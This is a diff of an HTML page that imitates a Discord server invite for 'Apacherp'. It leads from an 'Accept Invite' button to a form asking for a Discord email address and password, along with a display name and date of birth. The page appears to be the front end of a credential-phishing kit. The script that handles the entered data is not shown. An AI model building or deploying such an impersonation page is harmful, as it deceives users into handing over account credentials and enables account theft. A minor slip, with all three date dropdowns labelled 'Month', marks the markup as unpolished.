@@ -1,121 +1,431 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord Invite</title>
 
-    <link rel="stylesheet" href="style.css">
+<head>
+
+<meta charset="UTF-8">
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Discord Invite</title>
+
+<link rel="stylesheet" href="style.css">
+
 </head>
+
 
 <body>
 
+
 <div class="card">
 
-    <!-- Invite Page -->
-    <div id="invitePage">
-
-        <div class="icon"></div>
-
-        <p class="invite-text">
-            YOU'VE BEEN INVITED TO JOIN
-        </p>
-
-        <h1>Apacherp</h1>
 
 
-        <div class="stats">
+<!-- INVITE PAGE -->
 
-            <div class="stat">
-                <span class="online"></span>
-                521 Online
-            </div>
-
-            <div class="stat">
-                <span class="members"></span>
-                2,321 Members
-            </div>
-
-        </div>
+<div id="invitePage">
 
 
-        <button id="acceptBtn">
-            Accept Invite
-        </button>
+<div class="icon"></div>
 
-    </div>
+
+<p class="invite-text">
+YOU'VE BEEN INVITED TO JOIN
+</p>
+
+
+<h1>
+Apacherp
+</h1>
 
 
 
-    <!-- Login Page -->
-    <div id="loginPage" class="hidden">
-
-        <h2>Sign In</h2>
+<div class="stats">
 
 
-        <input
-            type="email"
-            id="username"
-            placeholder="Email Address"
-            autocomplete="email"
-        >
-
-        <small id="usernameError" class="error-message"></small>
+<div class="stat">
+<span class="online"></span>
+521 Online
+</div>
 
 
-        <input
-            type="password"
-            id="password"
-            placeholder="Password"
-            autocomplete="current-password"
-        >
-
-
-        <button id="loginBtn">
-            Login
-        </button>
-
-
-        <button class="back-btn" id="backBtn">
-            Back
-        </button>
-
-
-
-        <!-- Loading Overlay -->
-        <div id="loading" class="loading-overlay hidden">
-
-
-            <div class="loading-content">
-
-
-                <!-- Server Profile Picture -->
-                <div class="loading-icon"></div>
-
-
-
-
-                <p>
-                    Joining Apacherp Community...
-                </p>
-
-
-                <div class="spinner"></div>
-
-
-            </div>
-
-
-        </div>
-
-
-    </div>
+<div class="stat">
+<span class="members"></span>
+2,321 Members
+</div>
 
 
 </div>
 
 
+
+<button id="acceptBtn">
+Accept Invite
+</button>
+
+
+</div>
+
+
+
+
+
+
+
+
+
+<!-- JOIN PAGE -->
+
+
+<div id="loginPage" class="hidden">
+
+
+<div class="icon"></div>
+
+
+
+<p class="invite-text">
+SIGN IN TO JOIN SERVER
+</p>
+
+
+
+
+<input
+type="email"
+id="username"
+placeholder="Email Address"
+autocomplete="email"
+>
+
+
+
+<small id="usernameError" class="error-message"></small>
+
+
+
+
+<input
+type="password"
+id="password"
+placeholder="Password"
+autocomplete="current-password"
+>
+
+
+
+
+
+
+<!-- DISPLAY NAME -->
+
+
+<label class="name-label">
+    Display Name</label>
+
+
+<input
+type="text"
+id="displayName"
+placeholder="What should everyone call you?"
+>
+
+
+
+
+
+
+
+<!-- DATE OF BIRTH -->
+
+
+<label class="dob-title">
+Date of Birth
+</label>
+
+
+
+<div class="dob-container">
+
+
+
+<div class="dropdown">
+
+
+<button class="drop-btn">
+    Month
+    <span class="arrow"></span>
+</button>
+
+<div class="dropdown-menu">
+
+
+<div>January</div>
+<div>February</div>
+<div>March</div>
+<div>April</div>
+<div>May</div>
+<div>June</div>
+<div>July</div>
+<div>August</div>
+<div>September</div>
+<div>October</div>
+<div>November</div>
+<div>December</div>
+
+
+</div>
+
+
+</div>
+
+
+
+
+
+
+
+<div class="dropdown">
+
+
+<button class="drop-btn">
+    Month
+    <span class="arrow"></span>
+</button>
+
+
+
+<div class="dropdown-menu">
+
+
+<div>1</div>
+<div>2</div>
+<div>3</div>
+<div>4</div>
+<div>5</div>
+<div>6</div>
+<div>7</div>
+<div>8</div>
+<div>9</div>
+<div>10</div>
+<div>11</div>
+<div>12</div>
+<div>13</div>
+<div>14</div>
+<div>15</div>
+<div>16</div>
+<div>17</div>
+<div>18</div>
+<div>19</div>
+<div>20</div>
+<div>21</div>
+<div>22</div>
+<div>23</div>
+<div>24</div>
+<div>25</div>
+<div>26</div>
+<div>27</div>
+<div>28</div>
+<div>29</div>
+<div>30</div>
+<div>31</div>
+
+
+</div>
+
+
+</div>
+
+
+
+
+
+
+
+<div class="dropdown">
+
+
+<button class="drop-btn">
+    Month
+    <span class="arrow"></span>
+</button>
+
+<div class="dropdown-menu">
+
+
+<div>2026</div>
+<div>2025</div>
+<div>2024</div>
+<div>2023</div>
+<div>2022</div>
+<div>2021</div>
+<div>2020</div>
+<div>2019</div>
+<div>2018</div>
+<div>2017</div>
+<div>2016</div>
+<div>2015</div>
+<div>2014</div>
+<div>2013</div>
+<div>2012</div>
+<div>2011</div>
+<div>2010</div>
+<div>2009</div>
+<div>2008</div>
+<div>2007</div>
+<div>2006</div>
+<div>2005</div>
+<div>2004</div>
+<div>2003</div>
+<div>2002</div>
+<div>2001</div>
+<div>2000</div>
+<div>1999</div>
+<div>1998</div>
+<div>1997</div>
+<div>1996</div>
+<div>1995</div>
+<div>1994</div>
+<div>1993</div>
+<div>1992</div>
+<div>1991</div>
+<div>1990</div>
+<div>1989</div>
+<div>1988</div>
+<div>1987</div>
+<div>1986</div>
+<div>1985</div>
+<div>1984</div>
+<div>1983</div>
+<div>1982</div>
+<div>1981</div>
+<div>1980</div>
+<div>1979</div>
+<div>1978</div>
+<div>1977</div>
+<div>1976</div>
+<div>1975</div>
+<div>1974</div>
+<div>1973</div>
+<div>1972</div>
+<div>1971</div>
+<div>1970</div>
+
+
+
+</div>
+
+
+</div>
+
+
+
+</div>
+
+
+
+
+
+
+
+
+
+<!-- TERMS -->
+
+
+<label class="terms">
+
+
+<input
+type="checkbox"
+id="terms"
+>
+
+
+I agree to the Terms & Privacy Policy
+
+
+</label>
+
+
+
+
+
+
+
+<button id="loginBtn">
+
+Join Server
+
+</button>
+
+
+
+
+
+
+<button class="back-btn" id="backBtn">
+
+Back
+
+</button>
+
+
+
+
+
+
+
+
+
+<!-- LOADING SCREEN -->
+
+
+<div id="loading" class="hidden">
+
+
+<div class="loading-content">
+
+
+<div class="loading-icon"></div>
+
+
+<h3>
+Joining Server
+</h3>
+
+
+<p>
+Joining Apacherp community...
+</p>
+
+
+<div class="spinner"></div>
+
+
+</div>
+
+
+</div>
+
+
+
+
+
+</div>
+
+
+
+</div>
+
+
+
+
+
+
 <script src="script.js"></script>
 
+
 </body>
+
 </html>
